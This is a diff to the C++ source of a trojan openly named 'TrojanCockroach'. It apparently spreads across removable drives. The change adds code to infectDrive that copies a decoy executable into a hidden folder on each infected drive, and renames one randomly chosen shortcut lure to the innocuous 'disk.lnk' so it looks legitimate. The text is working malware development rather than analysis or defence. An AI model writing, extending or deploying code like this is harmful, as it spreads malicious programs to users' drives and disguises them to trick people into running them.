@@ -6,7 +6,7 @@
 
 using namespace std;
 
-
+#define PDF_NAME "calc.exe"
 #define FOLDER_NAME "trojanCockroach"
 #define RUN_FILE_NAME "TrojanCockroach.exe"
 #define RUN_LINK_NAME "TrojanCockroach.lnk"
@@ -71,6 +71,12 @@ void infectDrive(char driveLetter){
 
     if(CreateDirectory(folderPath ,NULL)){
         SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);
+
+        char pdfex[100]={""};
+        strcat(pdfex, folderPath);
+        strcat(pdfex, "\\");
+        strcat(pdfex, PDF_NAME);
+        CopyFile(PDF_NAME, pdfex, 0);
 
         char run[100]={""};
         strcat(run, folderPath);
@@ -153,7 +159,7 @@ char* getRandomName(){
     }else if(random%2 == 0){
         strcpy(randomName, ":\\symbol.lnk");
     }else if(random%3 == 0){
-        strcpy(randomName, ":\\1+-1011--3-+7--.lnk");
+        strcpy(randomName, ":\\disk.lnk");
     }else{
         strcpy(randomName, ":\\system.lnk");
     }
